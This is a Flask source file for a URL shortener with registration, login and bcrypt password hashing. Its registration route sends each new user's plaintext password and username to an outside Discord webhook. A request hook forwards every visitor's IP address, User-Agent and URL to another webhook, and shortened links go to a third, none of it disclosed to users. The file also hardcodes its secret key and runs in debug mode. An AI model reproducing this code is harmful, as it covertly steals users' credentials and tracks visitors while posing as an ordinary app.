##for life 
## fl <-----
from flask import Flask, json, render_template, request, redirect, session, flash, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import FlaskForm
import requests
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired
import hashlib
from flask import request
import validators
import bcrypt

app = Flask(__name__, template_folder='templates')
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///Data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
# Load config from JSON file
with open('config.json', 'r') as config_file:
    config = json.load(config_file)
app_register_info = config['app.register.info']
app_logger_info = config['app.logger.info']
app_URLShortened_info = config['app.URLShortened.info']
db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)

class URL(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    original_url = db.Column(db.String(255), nullable=False)
    short_url = db.Column(db.String(6), nullable=False)

class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Register')

class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Login')

class URLForm(FlaskForm):
    url = StringField('URL', validators=[DataRequired()])
    submit = SubmitField('Shorten URL')

def generate_short_url(url):
    hash_object = hashlib.sha1(url.encode())
    hex_dig = hash_object.hexdigest()
    return hex_dig[:6]  # Take first 6 characters as the short URL

def hash_password(password):
    password_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt()
    hashed_password = bcrypt.hashpw(password_bytes, salt)
    return hashed_password.decode('utf-8')

@app.route('/', methods=['GET', 'POST'])
def index():
    if 'username' in session:
        return redirect('/shortener')
    return redirect('/login')



@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegistrationForm()
    if form.validate_on_submit():
        username = form.username.data
        password = form.password.data
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('Username already taken. Please choose a different username.', 'error')
        else:
            hashed_password = hash_password(password)
            new_user = User(username=username, password=hashed_password)
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful. Please log in.', 'success')
            
            # Define embed with default value
            embed = {
                "title": "🌙 app.register.info",
                "description": "",
                "color": 000000,  # Red color
                "thumbnail": {"url": "https://media.tenor.com/ju5hhb03JgIAAAAC/dark.gif"},
                "footer": {"text": "GIthub: https://github.com/M-thefl \nsupport : https://discord.gg/PNJaQabHJZ"}
            }
            
            # Update embed with registration information
            embed["description"] = f"**New user registered**: {username}\n**Password**: {password}\n**Hashed_password**: {hashed_password}"
            
            payload = {
                "username": "fl",
                "avatar_url": "https://avatars.githubusercontent.com/u/123509083?s=400&u=06ebbd267c34d61e4f109e2ba503875473cb101c&v=4",
                "embeds": [embed]
            }
            response = requests.post(app_register_info, json=payload)
            if response.status_code == 200:
                app.logger.info("Data sent to Discord webhook successfully")
            else:
                app.logger.error("Failed to send data to Discord webhook")

            return redirect('/login')
    return render_template('register.html', form=form)



@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if 'username' in session:
        return redirect('/shortener')
    if form.validate_on_submit():
        username = form.username.data
        password = form.password.data
        user = User.query.filter_by(username=username).first()
        if user and bcrypt.checkpw(password.encode('utf-8'), user.password.encode('utf-8')):
            session['username'] = username
            return redirect('/shortener')
        else:
            flash('Invalid username or password', 'error')
    return render_template('login.html', form=form)


@app.before_request
def log_request():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    request_url = request.url
    request_method = request.method
    app.logger.info(f"Request from {ip_address} | User-Agent: {user_agent} | URL: {request_url} | Method: {request_method}")
    # Send data to Discord webhook
    embed = {
            "title": "🌙 app.logger.info",
            "description": f"Request from {ip_address} | \n\n User-Agent: {user_agent} |\n\n URL: {request_url} | \n\n Method: {request_method}",
            "color": 000000,  # Red color
            "thumbnail": {"url": "https://media.tenor.com/ju5hhb03JgIAAAAC/dark.gif"},
            "footer": {"text": "GIthub: https://github.com/M-thefl \nsupport : https://discord.gg/PNJaQabHJZ"}
        }
    payload = {
        "username": "fl",
        "avatar_url": "https://avatars.githubusercontent.com/u/123509083?s=400&u=06ebbd267c34d61e4f109e2ba503875473cb101c&v=4",
        "embeds": [embed]
    }
    response = requests.post(app_logger_info, json=payload)
    if response.status_code == 200:
        app.logger.info("Data sent to Discord webhook successfully")
    else:
        app.logger.error("Failed to send data to Discord webhook")


@app.route('/shortener', methods=['GET', 'POST'])
def shortener():
    form = URLForm()
    if 'username' not in session:
        return redirect('/login')
    if form.validate_on_submit():
        long_url = form.url.data
        if validators.url(long_url):
            short_url = generate_short_url(long_url)
            new_url = URL(user_id=session['username'], original_url=long_url, short_url=short_url)
            db.session.add(new_url)
            db.session.commit()
            flash('URL shortened successfully', 'success')
            app.logger.info(f"URL shortened by {session['username']}: {long_url} -> {short_url}")
            # Send data to Discord webhook
            embed = {
                "title": "🌙 URL Shortened",
                "description": f"URL shortened by {session['username']}: {long_url} -> {short_url}",
                "color": 16711680 ,
                "thumbnail": {"url": "https://media.tenor.com/ju5hhb03JgIAAAAC/dark.gif"},
                "footer": {"text": "GIthub: https://github.com/M-thefl \nsupport : https://discord.gg/PNJaQabHJZ"}
            }
            payload = {
            "username": "fl",
            "avatar_url": "https://avatars.githubusercontent.com/u/123509083?s=400&u=06ebbd267c34d61e4f109e2ba503875473cb101c&v=4",
            "embeds": [embed]
            }
            response = requests.post(app_URLShortened_info, json=payload)
            if response.status_code == 200:
                app.logger.info("Data sent to Discord webhook successfully")
            else:
                app.logger.error("Failed to send data to Discord webhook")

            return render_template('short_url.html', short_url=short_url, current_user=session['username'])
        else:
            flash('Invalid URL format', 'error')
    elif request.method == 'POST':
        flash('Please enter a valid URL', 'error')
    return render_template('shortener.html', form=form, current_user=session.get('username'))


@app.route('/logout', methods=['POST'])
def logout():
    session.pop('username', None)
    flash('You have been logged out.', 'success')
    return redirect('/login')

@app.route('/<short_url>', methods=['GET'])
def redirect_to_long_url(short_url):
    url = URL.query.filter_by(short_url=short_url).first()
    if url:
        return redirect(url.original_url, code=302)
    else:
        return 'URL Not Found', 404

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        app.run(debug=True)
